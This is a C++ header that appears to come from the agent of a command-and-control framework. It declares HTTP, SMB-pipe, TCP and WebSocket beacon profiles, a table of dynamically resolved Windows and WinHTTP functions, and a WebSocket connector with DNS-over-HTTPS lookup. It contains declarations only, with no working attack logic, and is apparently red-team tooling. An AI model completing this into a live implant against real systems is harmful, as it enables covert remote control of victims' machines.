#pragma once  

#include <windows.h>  
#include <winhttp.h>  

#ifndef PROFILE_STRUCT  
#define PROFILE_STRUCT  
typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD* ports;
	BOOL   use_ssl;
	BYTE* http_method;
	BYTE* uri;
	BYTE* parameter;
	BYTE* user_agent;
	BYTE* http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;

typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD* ports;
	BOOL   use_ssl;
	BYTE* ws_path;
	BYTE* user_agent;
} ProfileWS;
#endif  

#define DECL_API(x) decltype(x) * x  

struct WSFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);

	// WinHTTP functions  
	DECL_API(WinHttpOpen);
	DECL_API(WinHttpConnect);
	DECL_API(WinHttpOpenRequest);
	DECL_API(WinHttpSetOption);
	DECL_API(WinHttpSendRequest);
	DECL_API(WinHttpReceiveResponse);
	DECL_API(WinHttpQueryHeaders);
	DECL_API(WinHttpWebSocketCompleteUpgrade);
	DECL_API(WinHttpWebSocketSend);
	DECL_API(WinHttpWebSocketReceive);
	DECL_API(WinHttpWebSocketClose);
	DECL_API(WinHttpCloseHandle);
};

class ConnectorWS
{
	CHAR* user_agent = NULL;
	BOOL   ssl = FALSE;
	ULONG  server_count = 0;
	CHAR** server_address = NULL;
	WORD* server_ports = NULL;
	CHAR* ws_path = NULL;

	BYTE* recvData = NULL;
	int   recvSize = 0;

	WSFUNC* functions = NULL;

	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hWebSocket = NULL;

	ULONG server_index = 0;
	BOOL  connected = FALSE;



public:
	ConnectorWS();

	BOOL SetConfig(ProfileWS profile, BYTE* beat, ULONG beatSize);
	void CloseConnector();

	BOOL Connect();
	void SendData(BYTE* data, ULONG data_size);
	BYTE* RecvData();
	int   RecvSize();
	void  RecvClear();



	BOOL ResolveDomainViaDoh(CHAR* domain, CHAR* ipAddress, DWORD ipAddressSize);
};